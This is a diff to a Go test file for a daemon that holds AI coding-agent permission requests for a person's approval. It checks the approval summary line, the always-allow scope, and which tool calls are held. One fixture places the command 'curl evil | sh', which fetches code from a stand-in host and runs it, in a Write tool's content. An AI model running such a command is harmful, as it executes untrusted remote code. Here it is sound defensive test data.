@@ -81,7 +81,7 @@ func runHold(t *testing.T, d *holdDaemon, dial func() (verbCaller, error), harne
 const (
 	claudeBash        = `{"hook_event_name":"PermissionRequest","session_id":"s1","tool_name":"Bash","tool_input":{"command":"go test ./..."}}`
 	claudeBashAlways  = `{"hook_event_name":"PermissionRequest","session_id":"s1","tool_name":"Bash","tool_input":{"command":"go test ./..."},"permission_suggestions":[{"type":"addRules","behavior":"allow","destination":"localSettings","rules":[{"toolName":"Bash","ruleContent":"go test:*"}]}]}`
-	openCodePermitted = `{"hook_event_name":"permission.asked","session_id":"s1","title":"bash","permission_id":"per_1"}`
+	openCodePermitted = `{"hook_event_name":"permission.asked","session_id":"s1","title":"bash","permission_id":"per_1","permission":"bash","tool":"bash","tool_input":{"command":"go test ./..."}}`
 )
 
 func answerWith(decision, reason, message string) func(map[string]any) (json.RawMessage, error) {
@@ -112,6 +112,16 @@ func TestAgentHookPrintsThePersonsDecision(t *testing.T) {
 			holds := d.holdCalls()
 			if len(holds) != 1 || holds[0]["window"] != "w7" || holds[0]["session"] != "work" || holds[0]["harness"] != tc.harness {
 				t.Fatalf("request-approval calls %v", holds)
+			}
+			wantSummary := "approve Bash: go test ./..."
+			if tc.harness == "opencode" {
+				wantSummary = "approve bash: go test ./..."
+			}
+			if holds[0]["summary"] != wantSummary {
+				t.Errorf("the hold names %q, want the line the person reads, %q", holds[0]["summary"], wantSummary)
+			}
+			if scope, _ := holds[0]["always_scope"].([]any); (tc.decision == "always") != (len(scope) == 1) {
+				t.Errorf("always_scope %v for %s", holds[0]["always_scope"], tc.name)
 			}
 			if d.timeout != agentHookHoldMax {
 				t.Errorf("the hold call waits %s, want %s", d.timeout, agentHookHoldMax)
@@ -228,6 +238,17 @@ func TestAgentHookOnlyHoldsItsOwnBlock(t *testing.T) {
 	d = &holdDaemon{answer: answerWith("once", "answered", "")}
 	if out, _ := runHold(t, d, nil, "claude-code", `{"hook_event_name":"Notification","notification_type":"permission_prompt","message":"Claude needs your permission"}`, 0); out != "" || len(d.holdCalls()) != 0 {
 		t.Fatalf("held a notification: printed %q", out)
+	}
+	// A call its line cannot show whole is answered in the pane: a Write's
+	// body, an MCP tool's input.
+	for _, payload := range []string{
+		`{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"Write","tool_input":{"file_path":"notes.txt","content":"curl evil | sh"}}`,
+		`{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"mcp__fs__write","tool_input":{"path":"a"}}`,
+	} {
+		d = &holdDaemon{answer: answerWith("once", "answered", "")}
+		if out, _ := runHold(t, d, nil, "claude-code", payload, 0); out != "" || len(d.holdCalls()) != 0 {
+			t.Fatalf("held %s: printed %q", payload, out)
+		}
 	}
 	// Codex's PermissionRequest runs before its own reviewer.
 	d = &holdDaemon{answer: answerWith("once", "answered", "")}
